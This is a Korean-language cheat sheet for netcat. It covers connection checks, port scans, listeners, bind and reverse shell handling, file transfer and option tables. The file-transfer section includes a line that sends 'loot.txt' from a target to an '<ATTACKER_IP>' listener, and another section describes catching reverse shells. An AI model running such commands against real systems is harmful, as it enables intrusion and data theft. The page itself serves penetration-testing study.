# netcat

## 도구 개요

Netcat은 TCP·UDP 연결을 열거나 수신해 포트 도달성, 평문 배너와 데이터 스트림을 직접 확인하는 범용 네트워크 도구다. 간단한 연결 진단부터 수신 포트, 파일 전송, 셸 통신까지 최소한의 구성으로 처리할 때 유용하며 구현체별 옵션 차이를 확인해야 한다.

## 필요한 입력과 실행 환경

- 실행 환경: `nc`, `netcat` 또는 Ncat이 설치된 Linux/Windows 호스트
- 입력: 접속할 호스트와 포트 또는 열어 둘 로컬 listen 포트
- 프로토콜: 기본 TCP, 필요한 경우 `-u`로 UDP
- 셸·파일 전송 시 입력: 전달할 명령 스트림, payload 또는 파일

## 표준 사용법

```shell
nc [옵션] <host> <port>
nc -lvnp <port>
```

Netcat은 배포판에 따라 OpenBSD netcat, traditional netcat, Ncat 등 옵션 차이가 있다. `-e`, `-c`, `-q` 같은 옵션은 환경마다 지원 여부를 확인해야 한다.

## 대표 예시

### 포트 연결 확인

```shell
nc -nv <TARGET> 80
```

대상 포트에 직접 연결해 응답을 확인한다. HTTP처럼 텍스트 기반이면 직접 요청을 입력할 수 있다.

### 포트 스캔

```shell
nc -nvz <TARGET> 1-1000
```

간단한 포트 열림 여부를 확인한다. 대규모 스캔은 Nmap이 더 적합하다.

### 리스너 생성

```shell
nc -lvnp 4444
```

리버스 셸이나 임시 연결을 받을 때 가장 자주 쓰는 형태다.

### 리버스 셸 수신

```shell
nc -lvnp 9443
```

대상에서 공격자 IP와 포트로 연결하는 payload를 실행한 뒤 이 리스너에서 셸을 받는다.

### 바인드 셸 연결

```shell
nc -nv <TARGET> 4444
```

대상 쪽에서 포트를 열어 둔 bind shell에 접속한다.

### 파일 받기

```shell
nc -lvnp 9001 > loot.txt
```

공격자 쪽에서 파일을 받을 준비를 한다.

### 파일 보내기

```shell
nc <ATTACKER_IP> 9001 < loot.txt
```

대상 쪽에서 공격자 리스너로 파일을 전송한다. 전송 종료가 안 되면 지원되는 환경에서 `-q 1`을 추가한다.

### UDP 연결 테스트

```shell
nc -unv <TARGET> 53
```

UDP 서비스 연결을 확인한다. UDP는 응답이 없다고 해서 항상 닫힌 것은 아니다.

## 주요 옵션

| 옵션 | 의미 |
| --- | --- |
| `-l` | listen 모드 |
| `-v` | 자세한 출력 |
| `-n` | DNS 조회 비활성화 |
| `-p <port>` | 로컬 출발지 포트 지정 |
| `-s <ip>` | 로컬 출발지 IP 지정 |
| `-u` | UDP 모드 |
| `-z` | 데이터 전송 없이 포트 확인 |
| `-w <sec>` | 연결/읽기 타임아웃 |
| `-q <sec>` | EOF 후 지정 시간 뒤 종료. 구현체별 지원 차이 있음 |
| `-e`/`-c` | 프로그램 실행 연결. 많은 구현체에서 제거되거나 비활성화됨 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| 연결 성공 또는 배너 출력 | TCP/UDP 서비스와 통신 가능 | 수동 프로토콜 대화 또는 서비스별 클라이언트로 전환 |
| listener에 연결 수신 | reverse shell 또는 파일 전송 연결 도착 | 셸 안정화, `id/whoami`, 파일 전송 확인 |
| connection refused/timeout | 서비스 비활성화, 방화벽, IP/포트 오류 | 포트 상태와 라우팅, listen 주소 확인 |
| 입력 후 응답 없음 | 프로토콜 불일치 또는 blind 연결 | verbose 옵션, 다른 클라이언트, 패킷 캡처로 확인 |
